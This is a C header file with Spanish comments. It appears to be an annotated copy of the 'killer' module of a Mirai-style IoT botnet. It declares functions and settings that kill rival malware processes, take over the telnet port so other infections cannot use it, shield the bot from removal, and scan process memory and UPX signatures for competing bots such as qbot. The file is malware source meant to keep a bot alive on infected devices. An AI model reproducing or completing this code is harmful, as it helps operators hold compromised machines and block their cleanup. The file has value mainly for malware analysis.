/**
 * @file killer.h
 * @brief Módulo de eliminación de malware competidor y protección del bot
 *
 * Este módulo implementa la funcionalidad para:
 * - Detectar y eliminar otros malware
 * - Deshabilitar servicios que podrían ser utilizados para infección
 * - Proteger al bot contra intentos de eliminación
 * - Escanear la memoria en busca de patrones maliciosos
 */

#pragma once  // Previene inclusiones múltiples del encabezado

#include "includes.h"  // Definiciones comunes del bot

/**
 * @def KILLER_MIN_PID
 * @brief PID mínimo para comenzar el escaneo
 * 
 * Se establece en 400 para evitar matar procesos del sistema
 * que típicamente tienen PIDs bajos
 */
#define KILLER_MIN_PID              400

/**
 * @def KILLER_RESTART_SCAN_TIME
 * @brief Tiempo en segundos antes de reiniciar el escaneo completo
 * 
 * Después de este tiempo (600 segundos = 10 minutos), el killer
 * volverá a escanear desde el PID mínimo
 */
#define KILLER_RESTART_SCAN_TIME    600

/**
 * Definiciones para control de servicios
 * Determinan qué puertos se intentarán vincular para prevenir
 * que otros servicios los utilicen
 */
#define KILLER_REBIND_TELNET     // Vincula puerto 23 (telnet)
// #define KILLER_REBIND_SSH     // Vincula puerto 22 (ssh)
// #define KILLER_REBIND_HTTP    // Vincula puerto 80 (http)

/**
 * @brief Inicializa el módulo killer
 * 
 * Esta función:
 * 1. Crea un proceso hijo dedicado para el killer
 * 2. Deshabilita servicios configurados (telnet, ssh, http)
 * 3. Inicia el escaneo continuo de procesos
 * 4. Configura la protección contra eliminación
 */
void killer_init(void);

/**
 * @brief Termina el proceso killer
 * 
 * Envía una señal SIGKILL al proceso killer para detenerlo
 * cuando el bot necesita terminar limpiamente
 */
void killer_kill(void);

/**
 * @brief Mata procesos que estén usando un puerto específico
 * 
 * @param port Puerto a verificar (en orden de red, big-endian)
 * @return BOOL TRUE si se encontró y mató algún proceso, FALSE en caso contrario
 * 
 * Busca en /proc/net/tcp procesos que estén escuchando en el puerto
 * especificado y los termina. Usado principalmente para eliminar
 * servicios como telnet, SSH o HTTP.
 */
BOOL killer_kill_by_port(port_t);

/**
 * @brief Verifica si el proceso tiene acceso a su ejecutable
 * 
 * @return BOOL TRUE si tiene acceso, FALSE si no
 * 
 * Verifica el acceso a /proc/[pid]/exe y obtiene la ruta real
 * del ejecutable para comparaciones posteriores
 */
static BOOL has_exe_access(void);

/**
 * @brief Escanea la memoria de un proceso buscando patrones maliciosos
 * 
 * @param path Ruta al archivo de memoria del proceso
 * @return BOOL TRUE si se encontró algún patrón malicioso
 * 
 * Lee la memoria del proceso y busca patrones conocidos de
 * otros malware como qbot, zollard, etc.
 */
static BOOL memory_scan_match(char *);

/**
 * @brief Verifica si un ejecutable está empaquetado con UPX
 * 
 * @param exe_path Ruta al ejecutable
 * @param status_path Ruta al archivo de estado
 * @return BOOL TRUE si está empaquetado con UPX
 * 
 * Busca firmas de UPX y otros patrones sospechosos en el
 * ejecutable y su archivo de estado
 */
static BOOL status_upx_check(char *, char *);

/**
 * @brief Busca una subcadena en un buffer de memoria
 * 
 * @param buf Buffer donde buscar
 * @param buf_len Longitud del buffer
 * @param str Cadena a buscar
 * @param str_len Longitud de la cadena
 * @return BOOL TRUE si se encontró la cadena
 * 
 * Implementa búsqueda de subcadenas byte a byte para
 * encontrar patrones en la memoria de los procesos
 */
static BOOL mem_exists(char *, int, char *, int);
